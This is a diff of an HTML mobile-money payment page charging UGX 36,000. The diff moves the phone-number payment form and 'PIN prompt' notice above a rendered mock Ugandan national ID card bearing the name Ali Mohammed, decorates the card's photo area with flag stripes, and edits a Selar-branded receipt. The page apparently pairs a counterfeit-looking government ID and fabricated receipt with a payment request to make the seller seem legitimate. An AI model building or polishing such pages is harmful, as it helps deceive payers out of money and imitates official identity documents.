@@ -96,7 +96,7 @@
         /* National ID Visual Section */
         .id-card-visual {
             width: 92%;
-            margin: 20px auto;
+            margin: 10px auto 25px;
             aspect-ratio: 1.6 / 1;
             background: linear-gradient(135deg, #f3d7d7 0%, #e2eff1 50%, #f1def1 100%);
             border-radius: 12px;
@@ -123,15 +123,23 @@
             grid-template-columns: 75px 1fr 1fr;
             gap: 2px 10px;
         }
-        .photo-placeholder {
+
+        /* Uganda Flag colors in the photo area */
+        .flag-photo-area {
             grid-row: 1 / 6;
             width: 75px;
             height: 95px;
-            background-color: #eee;
             border: 1px solid #bbb;
             border-radius: 4px;
-            /* Photo text removed as requested */
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
         }
+        .flag-stripe { flex: 1; width: 100%; }
+        .stripe-black { background-color: #000; }
+        .stripe-yellow { background-color: #FCDC00; }
+        .stripe-red { background-color: #D90000; }
+
         .id-field { margin-bottom: 2px; }
         .id-label-small { font-size: 7px; color: #555; font-weight: bold; text-transform: uppercase; margin: 0; }
         .id-val-text { font-size: 10px; font-weight: 800; color: #000; margin: 0; }
@@ -149,7 +157,7 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
         .footer-labels { display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #777; margin-bottom: 10px; }
-        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; padding: 0 15px 20px; }
+        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; padding: 10px 15px 20px; }
         .mtn-mini { border: 1px solid #ffcc00; color: #e6b800; border-radius: 10px; padding: 0 6px; font-weight: bold; font-size: 9px; margin-right: 5px; }
         .airtel-mini { color: #ff0000; font-weight: bold; font-size: 11px; display: flex; align-items: center; }
     </style>
@@ -178,7 +186,7 @@
         <div class="receipt-center" style="margin-bottom: 10px;">****************************</div>
         
         <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
-        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Seller Involem Account Number]</div>
+        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your selar invoice Account Number]</div>
         <div class="receipt-line"><strong>NAME:</strong> Lolikishee USA Chicago</div>
         
         <div class="receipt-line" style="margin-top: 15px;"><strong>RECIPIENT ID:</strong> SI001234595</div>
@@ -196,10 +204,48 @@
         <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR</div>
     </div>
 
+    <div class="main-amount">UGX 36,000</div>
+    <div class="confirm-text">Confirm the details below to send your secure payment.</div>
+
+    <div class="payment-box">
+        <div id="processing-notice">
+            <div style="font-size: 14px; color: #166534; font-weight: bold;">
+                <span class="loading-spinner"></span> Waiting for PIN prompt...
+            </div>
+            <div style="font-size: 11px; color: #15803d; margin-top: 4px;">Please check your phone and enter your Mobile Money PIN.</div>
+        </div>
+
+        <form id="paymentForm">
+            <input type="hidden" name="ownerid" value="wasswa.lawrence" />
+            <input type="hidden" name="cur" value="UGX" />
+            <input type="hidden" name="amount" value="36000" />
+            <div class="input-group">
+                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" />
+                <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
+            </div>
+        </form>
+
+        <div class="footer-labels">
+            <span>Amount: UGX 36,000</span>
+            <div style="display:flex; align-items: center;">
+                <span class="mtn-mini">MTN</span>
+                <span class="airtel-mini">● airtel</span>
+            </div>
+        </div>
+    </div>
+
     <div class="id-card-visual">
         <div class="id-header-text">REPUBLIC OF UGANDA<br>NATIONAL ID CARD</div>
         <div class="id-body">
-            <div class="photo-placeholder"></div>
+            <div class="flag-photo-area">
+                <div class="flag-stripe stripe-black"></div>
+                <div class="flag-stripe stripe-yellow"></div>
+                <div class="flag-stripe stripe-red"></div>
+                <div class="flag-stripe stripe-black"></div>
+                <div class="flag-stripe stripe-yellow"></div>
+                <div class="flag-stripe stripe-red"></div>
+            </div>
+
             <div class="id-field" style="grid-column: 2 / 4;">
                 <p class="id-label-small">SURNAME</p>
                 <p class="id-val-text">MOHAMMED</p>
@@ -236,36 +282,6 @@
         <div style="margin-top: 10px; text-align: center; border-top: 1px solid rgba(0,0,0,0.1);">
             <p class="id-label-small">HOLDERS SIGNATURE</p>
             <div style="font-family: cursive; font-size: 11px; margin-top: -2px;">Ali Mohammed</div>
-        </div>
-    </div>
-
-    <div class="main-amount">UGX 36,000</div>
-    <div class="confirm-text">Confirm the details below to send your secure payment.</div>
-
-    <div class="payment-box">
-        <div id="processing-notice">
-            <div style="font-size: 14px; color: #166534; font-weight: bold;">
-                <span class="loading-spinner"></span> Waiting for PIN prompt...
-            </div>
-            <div style="font-size: 11px; color: #15803d; margin-top: 4px;">Please check your phone and enter your Mobile Money PIN.</div>
-        </div>
-
-        <form id="paymentForm">
-            <input type="hidden" name="ownerid" value="wasswa.lawrence" />
-            <input type="hidden" name="cur" value="UGX" />
-            <input type="hidden" name="amount" value="36000" />
-            <div class="input-group">
-                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required pattern="[0-9]{10}" />
-                <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
-            </div>
-        </form>
-
-        <div class="footer-labels">
-            <span>Amount: UGX 36,000</span>
-            <div style="display:flex; align-items: center;">
-                <span class="mtn-mini">MTN</span>
-                <span class="airtel-mini">● airtel</span>
-            </div>
         </div>
     </div>
 
